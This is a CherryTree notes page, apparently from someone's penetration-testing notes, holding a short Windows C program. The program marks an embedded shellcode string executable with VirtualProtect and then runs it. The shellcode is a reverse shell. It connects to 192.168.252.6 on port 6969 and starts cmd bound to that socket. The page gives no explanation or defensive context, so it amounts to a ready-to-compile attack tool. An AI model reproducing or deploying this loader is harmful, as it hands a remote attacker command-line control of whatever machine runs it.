<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>C file</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
  
    <script type="text/javascript">
        function in_frame () { try { return window.self !== window.top; } catch (e) { return true; } }
        if (!in_frame()) {
            var page = location.pathname.substring(location.pathname.lastIndexOf("/") + 1);
            window.location = 'index.html#' + page;
        }
    </script>
</head>
<body><div class="page"><h1 class="title">C file</h1><br/><div class="codebox"><div class="codebox"><span style="color:#7f0044;font-weight:700">#&nbsp;include&nbsp;&lt;stdlib.h&gt;</span><br /><span style="color:#7f0044;font-weight:700">#&nbsp;include&nbsp;&lt;stdio.h&gt;</span><br /><span style="color:#7f0044;font-weight:700">#&nbsp;include&nbsp;&lt;string.h&gt;</span><br /><span style="color:#7f0044;font-weight:700">#&nbsp;include&nbsp;&lt;windows.h&gt;</span><br /><br /><span style="color:#7f0044;font-weight:400">int</span>&nbsp;main(<span style="color:#7f0044;font-weight:400">void</span>)<br />{<br />&nbsp;&nbsp;<span style="color:#7f0044;font-weight:400">char</span>&nbsp;*shellcode&nbsp;=&nbsp;\<br /><span style="color:#3ad900;font-weight:400">"\x31\xc0\x66\xb8\x33\x32\x50\x68"</span><br /><span style="color:#3ad900;font-weight:400">"\x77\x73\x32\x5f\x54\xbb\x5c\x39"</span><br /><span style="color:#3ad900;font-weight:400">"\xe3\x77\xff\xd3\x89\xc5\x31\xc0"</span><br /><span style="color:#3ad900;font-weight:400">"\x66\xb8\x75\x70\x50\x68\x74\x61"</span><br /><span style="color:#3ad900;font-weight:400">"\x72\x74\x68\x57\x53\x41\x53\x54"</span><br /><span style="color:#3ad900;font-weight:400">"\x55\xbb\xd3\x33\xe3\x77\xff\xd3"</span><br /><span style="color:#3ad900;font-weight:400">"\x31\xdb\x66\xbb\x90\x01\x29\xdc"</span><br /><span style="color:#3ad900;font-weight:400">"\x54\x53\xff\xd0\x31\xc0\x66\xb8"</span><br /><span style="color:#3ad900;font-weight:400">"\x74\x41\x50\x68\x6f\x63\x6b\x65"</span><br /><span style="color:#3ad900;font-weight:400">"\x68\x57\x53\x41\x53\x54\x55\xbb"</span><br /><span style="color:#3ad900;font-weight:400">"\xd3\x33\xe3\x77\xff\xd3\x31\xdb"</span><br /><span style="color:#3ad900;font-weight:400">"\x53\x53\x53\x31\xc9\xb1\x06\x51"</span><br /><span style="color:#3ad900;font-weight:400">"\x43\x53\x43\x53\xff\xd0\x97\xbb"</span><br /><span style="color:#3ad900;font-weight:400">"\x65\x65\x63\x74\xc1\xeb\x08\x53"</span><br /><span style="color:#3ad900;font-weight:400">"\x68\x63\x6f\x6e\x6e\x54\x55\xbb"</span><br /><span style="color:#3ad900;font-weight:400">"\xd3\x33\xe3\x77\xff\xd3\x68\xc0"</span><br /><span style="color:#3ad900;font-weight:400">"\xa8\xfc\x06\x66\x68\x1b\x39\x31"</span><br /><span style="color:#3ad900;font-weight:400">"\xdb\x80\xc3\x02\x66\x53\x89\xe2"</span><br /><span style="color:#3ad900;font-weight:400">"\x6a\x10\x52\x57\xff\xd0\xba\x63"</span><br /><span style="color:#3ad900;font-weight:400">"\x63\x6d\x64\xc1\xea\x08\x52\x89"</span><br /><span style="color:#3ad900;font-weight:400">"\xe1\x31\xd2\x83\xec\x10\x89\xe3"</span><br /><span style="color:#3ad900;font-weight:400">"\x57\x57\x57\x52\x52\x31\xc0\x40"</span><br /><span style="color:#3ad900;font-weight:400">"\xc1\xc0\x08\x40\x50\x52\x52\x52"</span><br /><span style="color:#3ad900;font-weight:400">"\x52\x52\x52\x52\x52\x52\x52\x31"</span><br /><span style="color:#3ad900;font-weight:400">"\xc0\x04\x2c\x50\x89\xe0\x53\x50"</span><br /><span style="color:#3ad900;font-weight:400">"\x52\x52\x52\x31\xc0\x40\x50\x52"</span><br /><span style="color:#3ad900;font-weight:400">"\x52\x51\x52\xbb\x82\x20\xde\x77"</span><br /><span style="color:#3ad900;font-weight:400">"\xff\xd3\x31\xd2\x50\xb8\xcf\x2a"</span><br /><span style="color:#3ad900;font-weight:400">"\x98\x75\xff\xd0"</span>;<br /><br />&nbsp;&nbsp;DWORD&nbsp;run;<br />&nbsp;&nbsp;BOOL&nbsp;ret&nbsp;=&nbsp;VirtualProtect&nbsp;(shellcode,&nbsp;strlen(shellcode),<br />&nbsp;&nbsp;&nbsp;&nbsp;PAGE_EXECUTE_READWRITE,&nbsp;&amp;run);<br /><br />&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;(!ret)&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;printf&nbsp;(<span style="color:#3ad900;font-weight:400">"VirtualProtect\n"</span>);<br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">return</span>&nbsp;EXIT_FAILURE;<br />&nbsp;&nbsp;}<br /><br />&nbsp;&nbsp;printf(<span style="color:#3ad900;font-weight:400">"strlen(shellcode)=%d\n"</span>,&nbsp;strlen(shellcode));<br /><br />&nbsp;&nbsp;((<span style="color:#7f0044;font-weight:400">void</span>&nbsp;(*)(<span style="color:#7f0044;font-weight:400">void</span>))shellcode)();<br /><br />&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">return</span>&nbsp;EXIT_SUCCESS;<br />}<br /></div></div></div></body></html>